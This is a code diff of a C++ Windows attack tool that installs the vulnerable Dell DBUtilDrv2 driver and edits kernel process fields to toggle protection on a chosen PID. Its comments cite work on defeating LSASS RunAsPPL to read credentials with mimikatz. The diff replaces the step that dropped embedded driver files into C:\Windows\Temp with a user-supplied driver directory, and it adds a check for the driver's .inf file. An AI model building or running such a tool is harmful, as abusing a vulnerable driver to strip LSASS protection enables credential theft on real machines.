@@ -3,8 +3,8 @@
 #include <newdev.h>
 #include <iostream>
 #include <fstream>
+#include <filesystem>
 
-#include "resources.h"
 #include "popl.hpp"
 
 /**
@@ -15,7 +15,6 @@
  *    https://posts.specterops.io/mimidrv-in-depth-4d273d19e148
  *    https://itm4n.github.io/lsass-runasppl/
  *    https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
- * 
  */
 
 namespace
@@ -220,24 +219,7 @@ namespace
         file_out.close();
     }
 
-    void dropDrv27()
-    {
-        std::cout << "[+] Dropping version 2.7 to disk" << std::endl;
-        writeResource(IDR_RT_RCDATA1, "C:\\Windows\\Temp\\DBUtilDrv2.cat");
-        writeResource(IDR_RT_RCDATA2, "C:\\Windows\\Temp\\dbutildrv2.inf");
-        writeResource(IDR_RT_RCDATA3, "C:\\Windows\\Temp\\DBUtilDrv2.sys");
-        writeResource(IDR_RT_RCDATA4, "C:\\Windows\\Temp\\WdfCoInstaller01009.dll");
-    }
-
-    void dropDrv25()
-    {
-        std::cout << "[+] Dropping version 2.5 to disk" << std::endl;
-        writeResource(IDR_RT_RCDATA5, "C:\\Windows\\Temp\\DBUtilDrv2.cat");
-        writeResource(IDR_RT_RCDATA6, "C:\\Windows\\Temp\\dbutildrv2.inf");
-        writeResource(IDR_RT_RCDATA7, "C:\\Windows\\Temp\\DBUtilDrv2.sys");
-    }
-
-    bool driver2Setup(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData, char* p_infPath)
+    bool driver2Setup(HDEVINFO& p_devInfo, SP_DEVINFO_DATA& p_deviceInfoData, const char* p_infPath)
     {
         std::cout << "[+] Attempting driver install... " << std::endl;
 
@@ -304,7 +286,7 @@ int main(int p_argc, char* p_argv[])
     auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
     auto pid_option = op.add<popl::Value<int>, popl::Attribute::required>("p", "pid", "the target pid");
     auto enable_option = op.add<popl::Value<bool>, popl::Attribute::required>("e", "enable", "enable memory protection (0 or 1)");
-    auto dversion_option = op.add<popl::Value<bool>, popl::Attribute::required>("d", "driver_version", "Driver version to use (0 = 2.5, 1 = 2.7)");
+    auto driver_path = op.add<popl::Value<std::string>, popl::Attribute::required>("d", "driver_path", "The path to the driver inf, cat, and sys (and coinstaller)");
 
     try
     {
@@ -324,6 +306,15 @@ int main(int p_argc, char* p_argv[])
     }
 
     std::cout << "[+] User provided pid: " << pid_option->value() << std::endl;
+    std::cout << "[+] User provided driver directory: " << driver_path->value() << std::endl;
+
+    std::string path_str(driver_path->value());
+    path_str.append("\\dbutildrv2.inf");
+    if (std::filesystem::exists(path_str) == false)
+    {
+        std::cerr << "[!] Could not find the driver's inf file in the provided directory" << std::endl;
+        return EXIT_FAILURE;
+    }
 
     Offsets offsets = { 0, 0, 0 };
     if (!getVersionOffsets(offsets))
@@ -336,19 +327,9 @@ int main(int p_argc, char* p_argv[])
     std::cout << "\tActiveProcessLinkOffset = 0x" << offsets.ActiveProcessLinksOffset << std::endl;
     std::cout << "\tSignatureLevelOffset = 0x" << offsets.SignatureLevelOffset << std::endl;
 
-    if (dversion_option->value())
-    {
-        dropDrv27();
-    }
-    else
-    {
-        dropDrv25();
-    }
-
     HDEVINFO devInfo = NULL;
     SP_DEVINFO_DATA deviceInfoData = { };
-    char infPath[] = "C:\\Windows\\Temp\\dbutildrv2.inf\x00";
-    if (!driver2Setup(devInfo, deviceInfoData, infPath))
+    if (!driver2Setup(devInfo, deviceInfoData, path_str.c_str()))
     {
         return EXIT_FAILURE;
     }
